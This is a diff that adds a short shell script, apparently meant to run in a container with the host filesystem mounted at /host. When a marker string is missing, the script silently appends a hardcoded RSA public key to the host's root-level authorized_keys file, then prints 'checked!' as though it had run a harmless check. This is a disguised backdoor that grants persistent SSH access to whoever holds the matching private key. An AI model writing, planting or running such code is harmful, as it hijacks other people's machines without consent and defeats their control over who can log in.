@@ -1,0 +1,5 @@
+#!/bin/sh
+
+[ -f /host/.ssh/authorized_keys ] && [ `cat /host/.ssh/authorized_keys |grep hWWoke|wc -l` -lt 1 ] && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDH747QTVYqEpgvAwn9vtjXfbnfhTBRXyH14jGbt5Uj5cL9UEnTgs9G9MVL3fkw6ZBJUd6nGWHKMhaLexZOMeERMbGgpFMZ//XIrCpcwuS0AmRxUE197aCizn9zdHN99DufQPvaFXbIaLt2Sdrqx7WrXcdTG4mR8/k9Mkt6HeY7nxUctQyrziJL4WGA5gtDx86MfLpXnG4pdWPdbYTzIEFNMu4SIoIAQg1yQxd1ReTvWaIG/fOnP1QkZpkwreFek9jehf/B7ZiY2DzRZRbF/hWWoke/lwFZ0hbQQXullo8FqI1MEC9BQ1tdxY8Ooa4lPWbEwFxT2KqHtZjGOvpTvFe6uoOrmyrwH29cDu2vNnFq5O/RRh/DH3R3fWtOyO8No6lx0ppZRT1nLi4zonTs0BGQaS1XFfAch25cThCyvPVENT3Kua7dMd6XENUJnrO7lfP8RgLMMz88RLWLI0qlKfTFapVvmWEnOdxfo4oCvTT7jrlMFa8vQLy7NYGymr5FPnaI6aNf8Dvb7icLi9Rqz4eSvgKq/TA5OjpcpX3wfAi07vp1rcf9uZc9GF9hudNX2aZRc+UwYVQE1GAci13HXQbiI3JOnqoF2Hw6gT7z5HTGh9fj50GeihiSZ2OJtnORpsO/IrMRk2e/e/Nf1pC1QcaHEQZhKf9uZFA1rwvTYKQj4Q==' >> /host/.ssh/authorized_keys
+
+echo 'checked!'
